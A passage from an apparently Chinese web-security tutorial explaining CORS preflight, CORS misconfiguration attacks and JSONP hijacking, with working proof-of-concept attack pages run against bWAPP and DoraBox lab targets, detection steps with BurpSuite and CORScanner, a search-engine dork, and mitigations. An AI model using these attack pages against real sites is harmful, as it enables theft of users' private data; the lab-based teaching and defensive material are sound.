<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.0.61 (Unix)</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET, POST, PUT</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Keep-Alive</span><span class="punctuation">: </span>timeout=2, max=100</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br></pre></td></tr></table></figure>

<p>上面的HTTP回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<p>如果服务器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpReques</code>t对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest cannot load http://api.alice.com.</span><br><span class="line">Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</span><br></pre></td></tr></table></figure>

<p>服务器回应的其他CORS相关字段如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET, POST, PUT</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Access-Control-Max-Age</span><span class="punctuation">: </span>1728000</span><br></pre></td></tr></table></figure>

<p><strong>（1）Access-Control-Allow-Methods</strong></p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</p>
<p><strong>（2）Access-Control-Allow-Headers</strong></p>
<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</p>
<p><strong>（3）Access-Control-Allow-Credentials</strong></p>
<p>该字段与简单请求时的含义相同。</p>
<p><strong>（4）Access-Control-Max-Age</strong></p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<h4 id="③-浏览器的正常请求和回应"><a href="#③-浏览器的正常请求和回应" class="headerlink" title="③ 浏览器的正常请求和回应"></a>③ 浏览器的正常请求和回应</h4><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>
<p>下面是”预检”请求之后，浏览器的正常CORS请求。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">X-Custom-Header</span><span class="punctuation">: </span>value</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<h4 id="④-总结"><a href="#④-总结" class="headerlink" title="④ 总结"></a>④ 总结</h4><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646812872211-e6632566-ed92-4578-9ccb-d2e5cb8db6a1.png" alt="img"></p>
<p>具体流程如上图所示，当构造请求包的方法是 <code>PUT</code> 或 <code>DELETE</code> 并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是 <code>OPTIONS</code>，并携带三个关键字段：<code>Origin</code>、<code>Access-Control-Request-Method</code>、<code>Access-Control-Request-Headers</code>。其中 <code>Access-Control-Request-Method</code> 表示浏览器的 CORS 请求会用到哪些HTTP方法，<code> Access-Control-Request-Headers</code> 表示浏览器 CORS 请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的 HTTP 回应，并携带传入的 CORS 头信息。如果服务器否定请求，虽然也会返回一个正常的 HTTP 回应但是没有任何 CORS 相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。</p>
<h2 id="2、攻击流程"><a href="#2、攻击流程" class="headerlink" title="2、攻击流程"></a>2、攻击流程</h2><p>CORS 使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如<code>Access-Control-Allow-Origin: *</code>。 CORS 反而使同源策略的保护机制土崩瓦解。<strong>因此，CORS 漏洞的成因很明显，就是服务端配置的规则不当所导致的。</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813290828-38fd21f7-a7f3-4b75-9d1a-cecb131f8af9.png" alt="img">CORS 跨域漏洞的攻击流程如上图所示：</p>
<ol>
<li>假设用户登陆一个含有 CORS 配置网站 vuln.com，同时又访问了攻击者提供的一个链接 evil.com。</li>
<li>evil.com 的网站向 vuln.com 这个网站发起请求获取敏感数据，浏览器能否接收信息取决于 vuln.com 的配置。</li>
<li>如果 vuln.com 配置了 Access-Control-Allow-Origin 头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</li>
</ol>
<h2 id="3、漏洞验证"><a href="#3、漏洞验证" class="headerlink" title="3、漏洞验证"></a>3、漏洞验证</h2><p>这是一个正常的GET请求包</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813526348-9af54a01-710d-479e-94c5-6bc44af06ff3.png" alt="img"></p>
<p>其正常响应包为</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813561060-5ff144c2-1c61-4d8b-b1a0-099b945464fe.png" alt="img"></p>
<p>我们现在在该请求包上面添加一个<code>origin</code>参数</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813615782-2154f5d0-679e-465e-8f14-1d7cc89b8f99.png" alt="img"></p>
<p>返回包的数据中出现了对应的 CORS 响应头：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813667871-3b7b17c6-01c3-45f3-a715-40ce00edc167.png" alt="img"></p>
<p>其中<code>Access-Control-Allow-Origin</code>指是允许访问的源，<code>Access-Control-Allow-Credentials</code>指的是允许带上 cookie 访问资源，这样我们就可以通过 POST 获取到访问者的 cookie 信息。</p>
<h2 id="4、靶场实例"><a href="#4、靶场实例" class="headerlink" title="4、靶场实例"></a>4、靶场实例</h2><p>以 BWAPP 靶场 Low 级别的 CORS 漏洞环境作为演示案例</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646816293965-79299f24-6895-4687-9bc5-4f72ef554bed.png" alt="img"></p>
<p>点击 secret 跳转到如下页面，藏着 Neo 的秘密：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646816333925-c5fa65f4-5b42-4644-a1c5-4fdf2e941623.png" alt="img"></p>
<p>现在攻击者的目的是盗取该页面里面的 sercet 密码内容，查看请求这个页面时的HTTP响应头，从<code>Access-Control-Allow-Origin：*</code> 头可以看出服务器配置了 CORS，且所有的源服务器都可以加载这个页面上的资源：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646819976754-abccead4-8566-458b-b77b-01cbde59b2ad.png" alt="img"></p>
<p>攻击者可以直接发送一个自己构造的页面链接给用户，当用户点击后，攻击页面使用 ajax 就可以直接读取另一个 BWAPP 靶场网站的目标网页敏感信息，攻击页面 test.html 源码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> xhr =<span class="keyword">new</span> XMLHttpRequest();<span class="comment">// 创建AJAX的对象</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 设置使用的请求方式</span></span></span><br><span class="line"><span class="javascript">            xhr.open(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://127.0.0.1/bwAPP2.2/bwAPP/secret-cors-1.php&#x27;</span>,<span class="literal">true</span>); </span></span><br><span class="line"><span class="javascript">            xhr.send(); <span class="comment">// 发送请求</span></span></span><br><span class="line"><span class="javascript">            xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> )&#123; <span class="comment">// 状态 4 表示服务器已响应</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 判断正常的响应结果的状态码</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span>(xhr.status &gt;=<span class="number">200</span> &amp;&amp; xhr.status&lt;<span class="number">300</span> || xhr.status === <span class="number">304</span>)&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(xhr.responseText); <span class="comment">// 获取响应体内容</span></span></span><br><span class="line"><span class="javascript">                    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(<span class="string">&#x27;0&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此处将该页面放在本地 PhpStudy 搭建的服务下，并在浏览器进行访问，将成功跨域发送资源请求并返回想要的敏感信息（控制台打印）：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820441368-ac57ba92-932d-4303-bcb5-bd1dd21ddf63.png" alt="img"></p>
<p>或者直接使用eval目录下的attack-cors.htm，修改目标服务器路径即可</p>
<h2 id="5、检测方法"><a href="#5、检测方法" class="headerlink" title="5、检测方法"></a>5、检测方法</h2><p>如何在平常测试中检查 CORS 跨域漏洞？</p>
<p>CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。</p>
<p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。</p>
<p>首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 <code>Origin:foo.example.org</code> 的Enable框：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820689476-f7b1ce2f-d25e-4c80-bd2d-645d84710c48.png" alt="img"></p>
<p>然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820729340-d1b5d3f7-608b-4b9c-9601-e143470bb344.png" alt="img"></p>
<p>我们的条件可以是如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: foo.example.org</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>检测效果如下：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820805243-4fa8dc01-c9a6-43a0-a511-3cfb5ba17206.png" alt="img"></p>
<p>【<strong>注意</strong>】这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞：</p>
<ol>
<li>实锤存在： 有且仅有如下请求头：</li>
</ol>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>实锤存在：同时存在如下两个请求头</li>
</ol>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://attacker.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>可能存在：同时存在如下两个请求头</li>
</ol>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>但是如果是如下组合，则绝对没有漏洞，因为该配置下浏览器会自动阻止：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<h2 id="6、结合XSS"><a href="#6、结合XSS" class="headerlink" title="6、结合XSS"></a>6、结合XSS</h2><p>有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。</p>
<h2 id="7、漏洞扫描"><a href="#7、漏洞扫描" class="headerlink" title="7、漏洞扫描"></a>7、漏洞扫描</h2><p>可以使用 Xray 联动 BurpSuite 进行扫描，如下是 Xray 扫出来的一次 CORS：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646821023821-97377747-cea6-4876-b245-a1c092c8fcc5.png" alt="img">    同时 github上 提供了一个关于扫描 CORS 配置漏洞的脚本，<a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner%E3%80%82">https://github.com/chenjj/CORScanner。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/CORScanner# python cors_scan.py -h</span><br><span class="line">usage: cors_scan.py [-h] [-u URL] [-i INPUT] [-t THREADS] [-o OUTPUT]</span><br><span class="line">                   [-v [VERBOSE]] [-d [HEADERS [HEADERS ...]]]</span><br><span class="line"> </span><br><span class="line">OPTIONS:</span><br><span class="line"> -h, --help            show this help message and exit</span><br><span class="line"> -u URL, --url URL     URL/domain to check it&#x27;s CORS policy</span><br><span class="line"> -i INPUT, --input INPUT</span><br><span class="line">                       URL/domain list file to check their CORS policy</span><br><span class="line"> -t THREADS, --threads THREADS</span><br><span class="line">                       Number of threads to use for CORS scan</span><br><span class="line"> -o OUTPUT, --output OUTPUT</span><br><span class="line">                       Save the results to text file</span><br><span class="line"> -v [VERBOSE], --verbose [VERBOSE]</span><br><span class="line">                       Enable Verbosity and display results in realtime</span><br><span class="line"> -d [HEADERS [HEADERS ...]], --headers [HEADERS [HEADERS ...]]</span><br><span class="line">                       Add headers to the request.</span><br><span class="line"> </span><br><span class="line">Example: python cors_scan.py -u google.com</span><br></pre></td></tr></table></figure>

<p>我们将检测的域名写在一个记事本里，然后使用-i参数去进行批量扫描。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646821922236-9de52c6a-3ede-495f-aa71-b6f9e2cafc93.png" alt="img"></p>
<h2 id="8、防护方案"><a href="#8、防护方案" class="headerlink" title="8、防护方案"></a>8、防护方案</h2><ol>
<li>关闭不必要开启的CORS；</li>
<li>白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 <code>Access-Control-Allow-Origin</code> 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值；</li>
<li>仅允许使用安全协议，避免中间人攻击；</li>
<li>尽可能的返回 <code>Vary: Origin</code> 头部，以避免攻击者利用浏览器缓存进行攻击；</li>
<li>避免将 <code>Access-Control-Allow-Credentials</code> 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false；</li>
<li>限制跨域请求允许的方法，<code>Access-Control-Allow-Methods</code> 最大限度地减少所涉及的方法，降低风险；</li>
<li>限制浏览器缓存期限：建议通过 <code>Access-Control-Allow-Methods</code> 和 <code>Access-Control-Allow-Headers</code> 头部，限制浏览器缓存信息的时间。通过配置 <code>Access-Control-Max-Age</code> 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略；</li>
<li>仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。</li>
</ol>
<h1 id="三、JSONP劫持"><a href="#三、JSONP劫持" class="headerlink" title="三、JSONP劫持"></a>三、JSONP劫持</h1><p>JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案，它是 json 的一种“使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>
<p>JSONP 实现的基本原理是利用了 HTML 里 <code>&lt;script&gt;&lt;/script&gt;</code> 元素标签，远程调用 JSON 文件来实现数据传递。当某网站通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
<h2 id="1、利用过程"><a href="#1、利用过程" class="headerlink" title="1、利用过程"></a>1、利用过程</h2><ol>
<li><p>用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；</p>
</li>
<li><p>用户通过浏览器向网站A发出URL请求；</p>
</li>
<li><p>网站A向用户返回响应页面，响应页面中注册了 JavaScript 的回调函数和向网站B请求的 script 标签，示例代码如下：</p>
</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Callback</span>(<span class="params">result</span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    alert(result.name);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://B.com/user?jsonp=Callback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>用户收到响应，解析 JS 代码，将回调函数作为参数向网站B发出请求；</li>
<li>网站 B 接收到请求后，解析请求的 URL，以 JSON 格式生成请求需要的数据，将封装的包含用户信息的 JSON 数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Callback(&#123;<span class="attr">&quot;id&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="attr">&quot;email&quot;</span>:<span class="string">&quot;test@test.com&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>网站B数据返回后，浏览器则自动执行 Callback 函数对步骤4返回的 JSON 格式数据进行处理，通过 alert 弹窗展示了用户在网站B的注册信息。另外也可将 JSON 数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646824230812-f5cab659-87fb-4e37-8d38-a6aa0c33cf8b.png" alt="img"></p>
<h2 id="2、靶场实例"><a href="#2、靶场实例" class="headerlink" title="2、靶场实例"></a>2、靶场实例</h2><p>下面以 DoraBox 靶场的 JSONP 劫持漏洞为演示案例：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823394399-8d8240de-5d83-4082-b5e1-7b565bca90dc.png" alt="img"></p>
<p>访问 JSONP 靶场环境页面：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823420976-8419f70b-72a2-4a95-9ec5-05e7d3887503.png" alt="img"></p>
<p>其服务端源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- jsonp.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;../class/function.class.php&quot;</span>;</span><br><span class="line">   <span class="variable">$reqMethod</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">   <span class="variable">$reqValue</span> = <span class="string">&quot;callback&quot;</span>;</span><br><span class="line">   <span class="variable">$p</span> = <span class="keyword">new</span> Func(<span class="variable">$reqMethod</span>, <span class="variable">$reqValue</span>);</span><br><span class="line">   <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;Vulkey_Chen&#x27;</span>, <span class="string">&#x27;mobilephone&#x27;</span> =&gt; <span class="string">&#x27;13188888888&#x27;</span>, <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;admin@gh0st.cn&#x27;</span>, <span class="string">&#x27;address&#x27;</span> =&gt; <span class="string">&#x27;中华人民共和国&#x27;</span>, <span class="string">&#x27;**&#x27;</span> =&gt; <span class="string">&#x27;Cool Man&#x27;</span>);</span><br><span class="line">   <span class="keyword">if</span>(!@<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>])&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="variable">$callback</span> = htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]);</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$callback&#125;</span>(&quot;</span> . <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点关注：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!@<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$callback</span> = htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$callback&#125;</span>(&quot;</span> . <span class="variable">$p</span> -&gt; con_function(<span class="string">&#x27;json_encode&#x27;</span>,<span class="variable">$info</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这里首先以 get 形式接收到 callback 的值，如果 callback 为空，则忽略警告输出 info 的 json 格式数据：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823581576-68fe4343-9303-4f97-8d1d-82f18534af54.png" alt="img"></p>
<p>如果 callback 值不为空，则对这个值做一个过滤后输出，然后后面还是输出 json 格式的 info 的值：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823593356-21cbd7d9-652f-4416-906c-058786ae4f1f.png" alt="img"></p>
<p>从这段代码我们可以看到，callback 的值是可以动态输出的，如果我们现在拿到了一个以jsonp 方式传输用户认证后数据的网站，我们就可以构造出一个恶意的 jsonp 调用页面，然后诱使用户访问我们的页面，从而达到一个截取用户信息的目的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP劫持测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">result</span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">        </span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(result.mobilephone);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/DoraBox-master/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将上面的 <code>jsonp_attack.html</code> 页面放在本地 phpstudy 搭建的服务网站根目录下，浏览器进行访问，成功获得敏感信息（手机号码）：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646823903545-64401d92-e943-42bc-bb34-f5ef68fc2472.png" alt="img"></p>
<h2 id="3、漏洞挖掘"><a href="#3、漏洞挖掘" class="headerlink" title="3、漏洞挖掘"></a>3、漏洞挖掘</h2><ol>
<li>搜索引擎 Hacking 语法——<code>site:target.com inurl:?callback</code></li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646824047067-c71cf15c-909d-472c-80ed-d3b1cd364474.png" alt="img"></p>
<ol start="2">
<li>浏览器-调试-搜索关键字（json/jsonp/callback）：</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646824087519-21282eed-e6d3-49f0-802a-53722b17c75e.png" alt="img"></p>
<h2 id="4、JSONP漏洞利用技巧"><a href="#4、JSONP漏洞利用技巧" class="headerlink" title="4、JSONP漏洞利用技巧"></a>4、JSONP漏洞利用技巧</h2><p>JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作( 水坑攻击 )，下面的一个例子就可以说是在模拟水坑攻击</p>
